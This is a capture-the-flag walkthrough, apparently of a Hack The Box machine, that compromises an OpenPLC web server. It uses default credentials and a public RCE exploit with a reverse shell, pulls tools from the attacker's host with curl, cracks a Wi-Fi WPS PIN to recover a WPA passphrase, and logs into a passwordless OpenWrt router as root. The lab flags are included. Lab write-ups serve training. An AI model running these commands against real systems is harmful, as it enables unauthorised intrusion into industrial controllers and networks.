# Reconnaissances
## Port Scanning
`$ sudo nmap -p- -sV -sC -T4 10.10.11.7`
```
Nmap scan report for wifinetictwo.htb (10.10.11.7)
Host is up (0.064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://wifinetictwo.htb:8080/login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zf-yrw.BArx7hkN5nDTHfeHACG9usD-plk; Expires=Sun, 24-Mar-2024 05:02:19 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 24 Mar 2024 04:57:19 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.Zf-yrw.-tGHUapYFTi_Smd8EHQ9lu294sk; Expires=Sun, 24-Mar-2024 05:02:19 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 24 Mar 2024 04:57:19 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zf-yrw.BArx7hkN5nDTHfeHACG9usD-plk; Expires=Sun, 24-Mar-2024 05:02:19 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 24 Mar 2024 04:57:19 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=3/24%Time=65FFB35E%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm
SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\
SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn
SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.Zf-yrw\.-tGHUapYFTi_Smd8EHQ9l
SF:u294sk;\x20Expires=Sun,\x2024-Mar-2024\x2005:02:19\x20GMT;\x20HttpOnly;
SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x
SF:20Sun,\x2024\x20Mar\x202024\x2004:57:19\x20GMT\r\n\r\n<!DOCTYPE\x20HTML
SF:\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Red
SF:irecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x2
SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20hre
SF:f=\"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%
SF:r(HTTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html
SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co
SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.Zf-yrw\.BArx
SF:7hkN5nDTHfeHACG9usD-plk;\x20Expires=Sun,\x2024-Mar-2024\x2005:02:19\x20
SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz
SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Sun,\x2024\x20Mar\x202024\x2
SF:004:57:19\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x2
SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont
SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>4
SF:00\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20
SF:request\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon
SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG
SF:VybWFuZW50Ijp0cnVlfQ\.Zf-yrw\.BArx7hkN5nDTHfeHACG9usD-plk;\x20Expires=S
SF:un,\x2024-Mar-2024\x2005:02:19\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver
SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Sun,\x2024\x20Mar\
SF:x202024\x2004:57:19\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W
SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</ti
SF:tle>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x
SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\
SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga
SF:in\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.53 seconds
```

### Observe the HTTP
`$ echo "10.10.11.7 wifinetictwo.htb" | sudo tee -a /etc/hosts`
`$ firefox 10.10.11.7:8080`
```
Welcome to OpenPLC
```

Looking for `OpenPLC` default credentials
`$ git clone https://github.com/ihebski/DefaultCreds-cheat-sheet`
`$ cd DefaultCreds-cheat-sheet`
`$ pip3 install -r requirements.txt`
`$ ./creds search openplc`
```
+---------+----------+----------+
| Product | username | password |
+---------+----------+----------+
| openplc | openplc  | openplc  |
+---------+----------+----------+
```

Looking for `OpenPLC` exploit
`$ searchsploit openplc`
```
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenPLC 3 - Remote Code Execution (Authenticated)                                                                                  | python/webapps/49803.py
OpenPLC WebServer 3 - Denial of Service                                                                                            | multiple/dos/51746.txt
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results 
```

# Pre-Exploitation
`$ cp /usr/share/exploitdb/exploits/python/webapps/49803.py .`
`$ python3 49803.py`
```bash
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Specify an url target
[+] Example usage: exploit.py -u http://target-uri:8080 -l admin -p admin -i 192.168.1.54 -r 4444
```

Set Listeing port
```bash
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
```

`$ python3 49803.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.100 -r 9001`
```bash
[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Checking if host http://10.10.11.7:8080 is Up...
[+] Host Up! ...
[+] Trying to authenticate with credentials openplc:openplc
[+] Login success!
[+] PLC program uploading... 
[+] Attempt to Code injection...
[+] Spawning Reverse Shell...
[+] Failed to receive connection :(       
```

# Exploitation
Try to enhance the exploit code, change the line below:
```
compile_program = options.url + '/compile-program?file=681871.st'
```
To be:
```
compile_program = options.url + '/compile-program?file=blank_program.st'
```

**Then run the exploit:**
`$ python3 49803.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.100 -r 9001`
```bash
[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Checking if host http://10.10.11.7:8080 is Up...
[+] Host Up! ...
[+] Trying to authenticate with credentials openplc:openplc
[+] Login success!
[+] PLC program uploading... 
[+] Attempt to Code injection...
[+] Spawning Reverse Shell...
```

**The listening port:**
```
listening on [any] 9001 ...
connect to [10.10.14.100] from (UNKNOWN) [10.10.11.7] 39558
python3 -c 'import pty; pty.spawn("/bin/bash")'

root@attica03:/opt/PLC/OpenPLC_v3/webserver# cat /root/user.txt
f667780882567fae111b2a4800a46596
```

# Post-Exploitation
**Looking for something interesting**
`root@attica03:/tmp# uname -a`
```bash
Linux attica03 5.4.0-174-generic #193-Ubuntu SMP Thu Mar 7 14:29:28 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

`root@attica03:/tmp# lscpu`
```bash
Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  Address sizes:         43 bits physical, 48 bits virtual
  Byte Order:            Little Endian
CPU(s):                  2
  On-line CPU(s) list:   0,1
Vendor ID:               AuthenticAMD
  Model name:            AMD EPYC 7313P 16-Core Processor
    CPU family:          25
    Model:               1
    Thread(s) per core:  1
    Core(s) per socket:  1
    Socket(s):           2
    Stepping:            1
    BogoMIPS:            5988.75
    Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mc
                         a cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx m
                         mxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good 
                         nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pcl
                         mulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe p
                         opcnt aes xsave avx f16c rdrand hypervisor lahf_lm exta
                         pic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw
                          invpcid_single ibpb vmmcall fsgsbase bmi1 avx2 smep bm
                         i2 invpcid rdseed adx smap clflushopt clwb sha_ni xsave
                         opt xsavec xsaves clzero arat pku ospke overflow_recov 
                         succor
Virtualization features: 
  Hypervisor vendor:     VMware
  Virtualization type:   full
```

## Enumeration
**Listening port on local machine**
`$ python3 -m http.server 80`
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.7 - - [29/Mar/2024 14:08:49] "GET /linpeas.sh HTTP/1.1" 200 -
```
**Download linpeas.sh on target machine**
`root@attica02:/tmp# curl http://10.10.14.100/linpeas.sh -o linpeas.sh`
`root@attica02:/tmp# chmod +x linpeas.sh`
`root@attica02:/tmp# ./linpeas.sh`
```
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                         
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.3  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fefb:30c8  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:fb:30:c8  txqueuelen 1000  (Ethernet)
        RX packets 1978  bytes 1014683 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1176  bytes 396079 (396.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 25  bytes 1964 (1.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25  bytes 1964 (1.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`root@attica02:/tmp# iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis`
```
BSS 02:00:00:00:01:00(on wlan0)
        SSID: plcrouter
                 * Authentication suites: PSK
                 * SSID List
        WPS:     * Version: 1.0
```

# Lateral Movement
## Connect to the SSID `plcrouter`
In the local machine
`$ wget https://raw.githubusercontent.com/kimocoder/OneShot/master/oneshot.py`

In the remote machine
`root@attica02:/tmp# curl http://10.10.14.100/oneshot.py -o one.py`
`root@attica02:/tmp# python3 one.py -i wlan0 -b 02:00:00:00:01:00 -K`
```
[*] Running wpa_supplicant…
[*] Running wpa_supplicant…
[*] Trying PIN '12345670'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[P] E-Nonce: 9B1B93EB7BEE97212B3C2630BE39817A
[*] Sending WPS Message M2…
[P] PKR: 014238A5E2A656E6EBC43026E48F6C82E4F9726472A196DC07525BDE3AF487EA300F5CB15B5392974B46C725EE714797A2F84C8AF09762996132367975412DADAE8C07ED77FC4353283CD4C5E63C35A456C29310124A478F45C22987ADA29E7A77E8952DDE6F000EF7A417AA73F9B96EB578A75F8E6F6D9333B541FC012514DA86F46EEA1D27E7CF4917D62916BC9074E26D9C99FC5DEF56EA51D02321A8E4631ECAE62F226D3634523D6E37F4E86DC118264E2F3644DF14DCA6A4EBAACAC17E
[P] PKE: 63ED7F4F065DADADA818F40915AD27D3ED541F3C83FE278449AB2DAE64CF386C4AD3A7F342E26A645960AD1DDBA1AC59FB30D26C2CA894868732E8BCE64DC22261B1FAF3D15402982F9A31D7BC10CCFB283486B5198AE456FB055744F9334793C863E3DAE2C09D88E2C42CC89FF77281865791C874154EB67AEBBF5123362E21AA988F52BC9CFCDFB18118DC2CFCF82237F8E0A9795482E200EAF9746917C6A5847AD0E90D9E6C43DED8793B4625283C14384CC4F1CE49398564B461DC6BC4D9
[P] AuthKey: B3EC8AC7FFAD96B12E87BA00458AC5E97DE4B8C735B3382E54D6D78A7B2C41ED
[*] Received WPS Message M3
[P] E-Hash1: 0A34603B6E06CF1A487E652472FD8B14EBA5D749971934A71AC999ABE15FBF91
[P] E-Hash2: 16ED7E4D4C157466C4438936EC6900453F5B43257CC17B7129C4EAEBAB2490E7
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Received WPS Message M7
[+] WPS PIN: '12345670'
[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
[+] AP SSID: 'plcrouter'
```

**Save the WPA Password**
`root@attica01:/tmp# wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config`
`root@attica01:/tmp# wpa_supplicant -B -c config -i wlan0`
```
wpa_supplicant -B -c config -i wlan0
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```

`root@attica01:/tmp# ifconfig`
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.2  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fefc:910c  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:fc:91:0c  txqueuelen 1000  (Ethernet)
        RX packets 2392  bytes 292121 (292.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1540  bytes 565661 (565.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 135  bytes 8028 (8.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 135  bytes 8028 (8.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::ff:fe00:200  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 7  bytes 1223 (1.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16  bytes 2172 (2.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Try to input IP Address in wlan0 manually
`root@attica01:/tmp# ifconfig wlan0 192.168.1.7 netmask 255.255.255.0`
```
<r# ifconfig wlan0 192.168.1.7 netmask 255.255.255.0
```

Mapping the all existing Host on the network:
`root@attica01:/tmp# for i in {1..255}; do IP="192.168.1.$i"; ping -c 1 -W 1 "$IP" &>/dev/null && echo "$IP is reachable" || echo "$IP is not reachable"; done`
```
192.168.1.1 is reachable
192.168.1.2 is not reachable
192.168.1.3 is not reachable
192.168.1.4 is not reachable
192.168.1.5 is not reachable
192.168.1.6 is not reachable
192.168.1.7 is reachable
192.168.1.8 is not reachable
192.168.1.9 is not reachable
192.168.1.10 is not reachable
192.168.1.11 is not reachable
192.168.1.12 is not reachable
192.168.1.13 is not reachable
192.168.1.14 is not reachable
192.168.1.15 is not reachable
192.168.1.16 is not reachable
192.168.1.17 is not reachable
192.168.1.18 is not reachable
192.168.1.19 is not reachable
192.168.1.20 is not reachable
```

## Connect to `192.168.1.1` with `root` user.
`root@attica02:/tmp# ssh root@192.168.1.1`
```
ssh root@192.168.1.1
The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.
ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Warning: Permanently added '192.168.1.1' (ED25519) to the list of known hosts.


BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
root@ap:~# cat root.txt
cat root.txt
05c59afaee3e4cce02194ee3025e7d88
```